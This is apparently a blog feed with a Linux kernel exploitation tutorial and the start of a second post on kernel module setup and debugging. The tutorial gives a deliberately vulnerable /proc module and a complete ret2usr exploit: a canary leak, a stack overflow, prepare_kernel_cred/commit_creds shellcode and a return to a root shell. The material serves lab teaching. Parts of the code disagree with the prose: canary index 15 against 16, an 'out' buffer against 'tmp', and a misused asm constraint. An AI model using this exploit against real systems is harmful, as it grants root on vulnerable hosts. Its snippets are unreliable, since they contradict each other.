&lt;/code>&lt;/pre>&lt;p>Using the addresses we found earlier, we can write a bit of assembly that escalates our privileges to that of the root user.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-asm" data-lang="asm">&lt;span style="color:#a6e22e">xor&lt;/span> &lt;span style="color:#66d9ef">rdi&lt;/span>, &lt;span style="color:#66d9ef">rdi&lt;/span>
&lt;span style="color:#a6e22e">movabs&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>, &lt;span style="color:#ae81ff">0xffffffff810881c0&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">//&lt;/span> &lt;span style="color:#66d9ef">prepare_kernel_cred&lt;/span>
&lt;span style="color:#a6e22e">call&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>
&lt;span style="color:#a6e22e">movabs&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>, &lt;span style="color:#ae81ff">0xffffffff81087e80&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">//&lt;/span> &lt;span style="color:#66d9ef">commit_creds&lt;/span>
&lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">rdi&lt;/span>, &lt;span style="color:#66d9ef">rax&lt;/span>
&lt;span style="color:#a6e22e">call&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Let&amp;rsquo;s place this inside a function so we can easily use it within our final exploit.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">escalate_privileges&lt;/span>()
{
&lt;span style="color:#75715e">/* escalate privileges */&lt;/span>
__asm__(
&lt;span style="color:#e6db74">&amp;#34;.intel_syntax noprefix;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;xor rdi, rdi;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;movabs rbx, 0xffffffff810881c0;&amp;#34;&lt;/span> &lt;span style="color:#75715e">// prepare_kernel_cred
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#e6db74">&amp;#34;call rbx;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;movabs rbx, 0xffffffff81087e80;&amp;#34;&lt;/span> &lt;span style="color:#75715e">// commit_creds
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#e6db74">&amp;#34;mov rdi, rax;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;call rbx;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;.att_syntax;&amp;#34;&lt;/span>
);
&lt;span style="color:#75715e">/* return to user-space */&lt;/span>
load_user_space(&lt;span style="color:#75715e">/* target return address */&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/h2>
&lt;p>I&amp;rsquo;ve written a vulnerable kernel module to demonstrate the exploit technique detailed above. This kernel module has buffer overflow vulnerabilities in both its &lt;code>challenge_read&lt;/code> and &lt;code>challenge_write&lt;/code> functions.&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="1" type="checkbox" checked />
&lt;label for="1">
&lt;span class="collapsable-code__language">c&lt;/span>
&lt;span class="collapsable-code__title">challenge.c&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-c" >&lt;code>
#include &amp;lt;linux/kernel.h&amp;gt;
#include &amp;lt;linux/module.h&amp;gt;
#include &amp;lt;linux/fs.h&amp;gt;
#include &amp;lt;linux/proc_fs.h&amp;gt;
#include &amp;lt;linux/uaccess.h&amp;gt;
MODULE_LICENSE(&amp;#34;GPL&amp;#34;);
static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
{
char tmp[128];
return raw_copy_to_user(buf, tmp, len);
}
static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
{
char tmp[128];
return raw_copy_from_user(tmp, buf, len);
}
static int challenge_open(struct inode *inode, struct file *fp)
{
return 0;
}
static int challenge_release(struct inode *inode, struct file *fp)
{
return 0;
}
static struct file_operations fops = {
.read = challenge_read,
.write = challenge_write,
.open = challenge_open,
.release = challenge_release
};
struct proc_dir_entry *proc_entry;
int init_module(void)
{
proc_entry = proc_create(&amp;#34;challenge&amp;#34;, 0666, NULL, &amp;amp;fops);
return 0;
}
void cleanup_module(void)
{
if (proc_entry) {
proc_remove(proc_entry);
}
}
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>In the code block below we can see the kernel module&amp;rsquo;s &lt;code>read&lt;/code> handler. It copies an arbitrary number of bytes from a 128 byte buffer into a globally accessible buffer &lt;code>out&lt;/code> of size 256 bytes. This means we can read 128 bytes below the small &lt;code>tmp&lt;/code> buffer.&lt;/p>
&lt;p>Perhaps we can use this to read stack values (e.g. the value of the stack canary).&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> ssize_t &lt;span style="color:#a6e22e">challenge_read&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buf, size_t len, loff_t &lt;span style="color:#f92672">*&lt;/span>off)
{
&lt;span style="color:#66d9ef">char&lt;/span> tmp[&lt;span style="color:#ae81ff">128&lt;/span>];
&lt;span style="color:#66d9ef">return&lt;/span> raw_copy_to_user(buf, tmp, len);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>In the code block below we can see the kernel module&amp;rsquo;s &lt;code>write&lt;/code> handler. It copies an arbitrary number of bytes into a 256 byte buffer &lt;code>out&lt;/code>, that are then copied into a buffer stored on the stack &lt;code>tmp&lt;/code> of size 128 bytes.&lt;/p>
&lt;p>This gives us a buffer overflow of 128 bytes that we can potentially use to control process execution.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> ssize_t &lt;span style="color:#a6e22e">challenge_write&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buf, size_t len, loff_t &lt;span style="color:#f92672">*&lt;/span>off)
{
&lt;span style="color:#66d9ef">char&lt;/span> tmp[&lt;span style="color:#ae81ff">128&lt;/span>];
&lt;span style="color:#66d9ef">return&lt;/span> raw_copy_from_user(out, buf, len);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="exploiting-the-kernel-module">Exploiting the Kernel Module&lt;/h2>
&lt;p>First, let&amp;rsquo;s use the buffer overflow vulnerability in the kernel module&amp;rsquo;s &lt;code>read&lt;/code> function to dump a bunch of stack values. The below code reads 32 &lt;code>unsigned long&lt;/code> values (256 bytes) and prints them out.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;assert.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;fcntl.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv)
{
&lt;span style="color:#66d9ef">int&lt;/span> fd &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;/proc/challenge&amp;#34;&lt;/span>, O_RDWR);
assert(fd &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> leak[&lt;span style="color:#ae81ff">32&lt;/span>];
read(fd, leak, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>);
&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i)
printf(&lt;span style="color:#e6db74">&amp;#34;%d: 0x%lx&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, i, leak[i]);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>In the output below we can see a couple values that look like a stack canary and a return address in kernel-space. We can see these are at indexes 16 and 17.&lt;/p>
&lt;pre>&lt;code>/home/ctf # ./exploit
0: 0xffffffff81c00194
1: 0xffffffff81c001a0
2: 0xffffffff81aa85a0
3: 0xffffffff81345d8b
4: 0x4
5: 0xffff888006bf5700
6: 0x20000075a4070
7: 0xffff888006bf5710
8: 0x100020000
9: 0x0
10: 0xffff888000000000
11: 0x0
12: 0x0
13: 0x0
14: 0x0
15: 0xa73ee2eeab3d9f00
16: 0xa73ee2eeab3d9f00 &amp;lt;-- stack canary
17: 0xffff888006bcd840 &amp;lt;-- return address
...
&lt;/code>&lt;/pre>&lt;p>Now we can write a function that leaks the stack canary, so we can use it later when we want to redirect process execution. From our investigation above we can see that the stack canary is stored at index 16 (just below the &lt;code>tmp&lt;/code> buffer on the stack).&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#a6e22e">leak_canary&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> fd)
{
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> leak[&lt;span style="color:#ae81ff">32&lt;/span>];
read(fd, leak, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span> leak[&lt;span style="color:#ae81ff">15&lt;/span>];
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We should also write a function that overflows the buffer in the &lt;code>write&lt;/code> handler and redirect process execution to our &lt;code>escalate_privileges&lt;/code> function. We&amp;rsquo;ll also want to overwrite the stack canary so the kernel module doesn&amp;rsquo;t detect the overflow and halt execution.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">overflow_buffer&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> fd, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> canary)
{
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> payload[&lt;span style="color:#ae81ff">18&lt;/span>];
payload[&lt;span style="color:#ae81ff">16&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> canary;
payload[&lt;span style="color:#ae81ff">17&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>)escalate_privileges;
write(fd, payload, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">18&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="environment-setup">Environment Setup&lt;/h2>
&lt;p>In order for this technique to work, we&amp;rsquo;ll need to disable all kernel exploit mitigation features in our kernel emulator. This means removing all instances of &lt;code>+smep&lt;/code>, &lt;code>+smap&lt;/code>, &lt;code>kpti=1&lt;/code> and &lt;code>kaslr&lt;/code>, and adding the &lt;code>nokaslr&lt;/code> and &lt;code>nopti&lt;/code> flags.&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="2" type="checkbox" />
&lt;label for="2">
&lt;span class="collapsable-code__language">sh&lt;/span>
&lt;span class="collapsable-code__title">launch.sh&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-sh" >&lt;code>
#!/bin/bash
# build root fs
pushd fs
find . -print0 | cpio --null -ov --format=newc | gzip -9 &amp;gt; ../initramfs.cpio.gz
popd
# launch
/usr/bin/qemu-system-x86_64 \
-kernel linux-5.4/arch/x86/boot/bzImage \
-initrd $PWD/initramfs.cpio.gz \
-fsdev local,security_model=passthrough,id=fsdev0,path=$HOME \
-device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare \
-nographic \
-monitor none \
-s \
-append &amp;#34;console=ttyS0 nokaslr nopti quiet&amp;#34;
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>Running the build and then the run scripts will drop us into a root shell on the kernel emulator.&lt;/p>
&lt;pre>&lt;code>~/pwnkernel $ ./build.sh
...
~/pwnkernel $ ./launch.sh
/ # id
uid=0(root) gid=0
&lt;/code>&lt;/pre>&lt;h2 id="building-the-exploit">Building the Exploit&lt;/h2>
&lt;p>First, let&amp;rsquo;s write a simple function that will spawn a shell via the &lt;code>system&lt;/code> function. We&amp;rsquo;ll need this after we return to user-space after escalating privileges.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">shell&lt;/span>()
{
system(&lt;span style="color:#e6db74">&amp;#34;/bin/sh&amp;#34;&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now let&amp;rsquo;s write the main logic of our exploit, it will do several things:&lt;/p>
&lt;ol>
&lt;li>Save the initial user-space state.&lt;/li>
&lt;li>Leak the stack canary with the vulnerability in the &lt;code>read&lt;/code> handler to perform a safe overflow.&lt;/li>
&lt;li>Overflow the vulnerable buffer and redirect execution to our &lt;code>escalate_privileges&lt;/code> function.&lt;/li>
&lt;li>Escalate privileges in kernel-space.&lt;/li>
&lt;li>Return to user-space and get a root shell.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv)
{
save_user_space();
&lt;span style="color:#66d9ef">int&lt;/span> fd &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;/proc/challenge&amp;#34;&lt;/span>, O_RDWR);
assert(fd &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;span style="color:#75715e">/* leak stack canary */&lt;/span>
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> canary &lt;span style="color:#f92672">=&lt;/span> leak_canary(fd);
printf(&lt;span style="color:#e6db74">&amp;#34;[*] canary @ 0x%lx&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, canary);
overflow_buffer(fd, canary);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>You can find the complete exploit code below.&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="3" type="checkbox" checked />
&lt;label for="3">
&lt;span class="collapsable-code__language">c&lt;/span>
&lt;span class="collapsable-code__title">exploit.c&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-c" >&lt;code>
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;assert.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
unsigned long save_ss, save_sp, save_rf, save_cs;
void shell()
{
system(&amp;#34;/bin/sh&amp;#34;);
}
void save_user_space()
{
/* save user-space */
__asm__(
&amp;#34;.intel_syntax noprefix;&amp;#34;
&amp;#34;mov save_ss, ss;&amp;#34;
&amp;#34;mov save_sp, rsp;&amp;#34;
&amp;#34;pushf;&amp;#34;
&amp;#34;pop save_rf;&amp;#34;
&amp;#34;mov save_cs, cs;&amp;#34;
&amp;#34;.att_syntax;&amp;#34;
);
}
void load_user_space(unsigned long target)
{
/* return to user-space */
__asm__(
&amp;#34;.intel_syntax noprefix;&amp;#34;
&amp;#34;swapgs;&amp;#34;
&amp;#34;mov r15, save_ss;&amp;#34;
&amp;#34;push r15;&amp;#34;
&amp;#34;mov r15, save_sp;&amp;#34;
&amp;#34;push r15;&amp;#34;
&amp;#34;mov r15, save_rf;&amp;#34;
&amp;#34;push r15;&amp;#34;
&amp;#34;mov r15, save_cs;&amp;#34;
&amp;#34;push r15;&amp;#34;
&amp;#34;mov r15, %[rip];&amp;#34;
&amp;#34;push r15;&amp;#34;
&amp;#34;iretq;&amp;#34;
&amp;#34;.att_syntax;&amp;#34;
: [rip] &amp;#34;=&amp;amp;r&amp;#34; (target)
);
}
void escalate_privileges()
{
/* escalate privileges */
__asm__(
&amp;#34;.intel_syntax noprefix;&amp;#34;
&amp;#34;xor rdi, rdi;&amp;#34;
&amp;#34;movabs rbx, 0xffffffff810881c0;&amp;#34; // prepare_kernel_cred
&amp;#34;call rbx;&amp;#34;
&amp;#34;movabs rbx, 0xffffffff81087e80;&amp;#34; // commit_creds
&amp;#34;mov rdi, rax;&amp;#34;
&amp;#34;call rbx;&amp;#34;
&amp;#34;.att_syntax;&amp;#34;
);
/* return to user-space */
load_user_space((unsigned long)shell);
}
unsigned long leak_canary(int fd)
{
unsigned long leak[32];
read(fd, leak, sizeof(unsigned long) * 32);
return leak[15];
}
void overflow_buffer(int fd, unsigned long canary)
{
unsigned long payload[18];
payload[15] = canary;
payload[17] = (unsigned long)escalate_privileges;
write(fd, payload, sizeof(unsigned long) * 18);
}
int main(int argc, char **argv)
{
save_user_space();
int fd = open(&amp;#34;/proc/challenge&amp;#34;, O_RDWR);
assert(fd &amp;gt; 0);
/* leak stack canary */
unsigned long canary = leak_canary(fd);
printf(&amp;#34;[*] canary @ 0x%lx\n&amp;#34;, canary);
overflow_buffer(fd, canary);
return 0;
}
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>Note that the exploit code will need to be compiled as a static executable in order to run on the kernel emulator.&lt;/p>
&lt;pre>&lt;code>~/ $ gcc exploit.c -o exploit -static
&lt;/code>&lt;/pre>&lt;p>After inserting the vulnerable kernel module and running our exploit we can see that our exploit leaked the stack canary and gave us a root shell.&lt;/p>
&lt;pre>&lt;code>/ # insmod challenge.ko
/ # su ctf
/ $ /home/ctf/exploit
...
/ # id
uid=0(root) gid=0
&lt;/code>&lt;/pre>&lt;h2 id="appendix">Appendix&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/">Learning Linux Kernel Exploitation - Part 1&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://old.iseclab.org/projects/vifuzz/docs/exploit.pdf">iSecLab - Kernel-mode exploits primer&lt;/a>&lt;/li>
&lt;/ul></content></item><item><title>Linux Kernel 0x00 :: Kernel Module Interaction</title><link>https://anvbis.github.io/posts/linux-kernel-0-kernel-module-interaction/</link><pubDate>Wed, 19 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-0-kernel-module-interaction/</guid><description>Table of Contents Environment Setup Debugging in the Kernel Kernel Module Overview Compiling Kernel Modules Inserting Kernel Modules Interacting with File-based Operations Interacting with IOCTL Environment Setup The easiest kernel exploitation environment to set up for beginners (in my opinion) is pwnkernel. It will allow us to do several things that are central to Linux kernel research:
Downloading and building specific Kernel versions. Streamlining the kernel module build process.</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
&lt;ol>
&lt;li>&lt;a href="#environment-setup">Environment Setup&lt;/a>&lt;/li>
&lt;li>&lt;a href="#debugging-in-the-kernel">Debugging in the Kernel&lt;/a>&lt;/li>
&lt;li>&lt;a href="#kernel-module-overview">Kernel Module Overview&lt;/a>&lt;/li>
&lt;li>&lt;a href="#compiling-kernel-modules">Compiling Kernel Modules&lt;/a>&lt;/li>
&lt;li>&lt;a href="#inserting-kernel-modules">Inserting Kernel Modules&lt;/a>&lt;/li>
&lt;li>&lt;a href="#interacting-with-file-based-operations">Interacting with File-based Operations&lt;/a>&lt;/li>
&lt;li>&lt;a href="#interacting-with-ioctl">Interacting with IOCTL&lt;/a>&lt;/li>
&lt;/ol>
&lt;h2 id="environment-setup">Environment Setup&lt;/h2>
&lt;p>The easiest kernel exploitation environment to set up for beginners (in my opinion) is pwnkernel. It will allow us to do several things that are central to Linux kernel research:&lt;/p>
&lt;ul>
&lt;li>Downloading and building specific Kernel versions.&lt;/li>
&lt;li>Streamlining the kernel module build process.&lt;/li>
&lt;li>Emulate specific kernel versions under the QEMU virtual machine.&lt;/li>
&lt;/ul>
&lt;p>Installation is pretty simple, just clone the repository and run the build script.&lt;/p>
&lt;pre>&lt;code>~/ $ git clone https://github.com/pwncollege/pwnkernel.git
Cloning into 'pwnkernel'...
remote: Enumerating objects: 115, done.
remote: Counting objects: 100% (115/115), done.
remote: Compressing objects: 100% (73/73), done.
remote: Total 115 (delta 59), reused 92 (delta 37), pack-reused 0
Receiving objects: 100% (115/115), 18.84 KiB | 9.42 MiB/s, done.
Resolving deltas: 100% (59/59), done.
&lt;/code>&lt;/pre>&lt;p>You can optionally specify the kernel version you want to download and compile within the &lt;code>build.sh&lt;/code> script. By default it should be Linux version 5.4.0.&lt;/p>
&lt;pre>&lt;code>~/ $ cd pwnkernel/
~/pwnkernel $ ./build.sh
&lt;/code>&lt;/pre>&lt;p>Running the virtual machine is equally simple, it&amp;rsquo;s as easy as executing the &lt;code>launch.sh&lt;/code> script. Note that the target kernel version is specified within this script. After executing we can see we&amp;rsquo;re dropped into a shell inside the virtual machine.&lt;/p>
&lt;p>Note: by defauled pwnkernel launches the emulator without any kernel space protections (e.g. kpti, smap, smep, etc).&lt;/p>
&lt;pre>&lt;code>~/pwnkernel $ ./launch.sh
&lt;/code>&lt;/pre>&lt;pre>&lt;code>/ # id
uid=0(root) gid=0
&lt;/code>&lt;/pre>&lt;h2 id="debugging-in-the-kernel">Debugging in the Kernel&lt;/h2>
&lt;p>First launch the kernel virtual machine in a separate terminal window.&lt;/p>
&lt;pre>&lt;code>~/pwnkernel $ ./launch.sh
&lt;/code>&lt;/pre>&lt;p>Then we need to open &lt;code>pwnkernel/linux-5.4/vmlinux&lt;/code> with GDB and we&amp;rsquo;ll be able to debug the kernel as we see fit. This will allow us to resolve kernel symbols and view kernel memory.&lt;/p>
&lt;pre>&lt;code>~/pwnkernel $ gdb linux-5.4/vmlinux
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type &amp;quot;show copying&amp;quot; and &amp;quot;show warranty&amp;quot; for details.
This GDB was configured as &amp;quot;x86_64-linux-gnu&amp;quot;.
Type &amp;quot;show configuration&amp;quot; for configuration details.
For bug reporting instructions, please see:
&amp;lt;http://www.gnu.org/software/gdb/bugs/&amp;gt;.
Find the GDB manual and other documentation resources online at:
&amp;lt;http://www.gnu.org/software/gdb/documentation/&amp;gt;.
For help, type &amp;quot;help&amp;quot;.
Type &amp;quot;apropos word&amp;quot; to search for commands related to &amp;quot;word&amp;quot;...
pwndbg: loaded 198 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from linux-5.4/vmlinux...
&lt;/code>&lt;/pre>&lt;p>By default the &lt;code>launch.sh&lt;/code> script will run QEMU with a gdbserver instance on port &lt;code>1234&lt;/code>. We can connect to this with the following command.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; target remote :1234
Remote debugging using :1234
default_idle () at arch/x86/kernel/process.c:581
&lt;/code>&lt;/pre>&lt;p>Then, debugging is almost identical to debugging any other binary - we can set breakpoints, step through code, etc. Keep in mind however, when the debugger is paused you will be unable to interact with the Kernel (i.e. enter any commands, etc) until you continue execution.&lt;/p>
&lt;h2 id="kernel-module-overview">Kernel Module Overview&lt;/h2>
&lt;p>Below is a code snippet containing the core parts of a kernel module. These include &lt;code>open&lt;/code>, &lt;code>release&lt;/code>, &lt;code>init_module&lt;/code>, and &lt;code>cleanup_module&lt;/code> functions.&lt;/p>
&lt;p>The &lt;code>init_module&lt;/code> function is called when the module is inserted into the kernel. It will typically create an entry under &amp;lsquo;/proc/&amp;rsquo; or &amp;lsquo;/dev/&amp;rsquo; that the user can interact with.&lt;/p>
&lt;p>The &lt;code>cleanup_module&lt;/code> function is called when the kernel module is removed from the kernel. It will typically remove whatever entry it created within the &lt;code>init_module&lt;/code> function logic.&lt;/p>
&lt;p>The &lt;code>open&lt;/code> function is called when the entry is opened for read/write operations. While the &lt;code>release&lt;/code> function is called when that entry is closed.&lt;/p>
&lt;p>The &lt;code>read&lt;/code> and &lt;code>write&lt;/code> functions are also important for interacting with the kernel module, but more on these later.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> ssize_t &lt;span style="color:#a6e22e">challenge_read&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buf, size_t len, loff_t &lt;span style="color:#f92672">*&lt;/span>off)
{
&lt;span style="color:#75715e">// read from kernel space
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;span style="color:#66d9ef">static&lt;/span> ssize_t &lt;span style="color:#a6e22e">challenge_write&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buf, size_t len, loff_t &lt;span style="color:#f92672">*&lt;/span>off)
{
&lt;span style="color:#75715e">// write to kernel space
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">challenge_open&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> inode &lt;span style="color:#f92672">*&lt;/span>inode, &lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp)
{
&lt;span style="color:#75715e">// when kernel module is opened
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
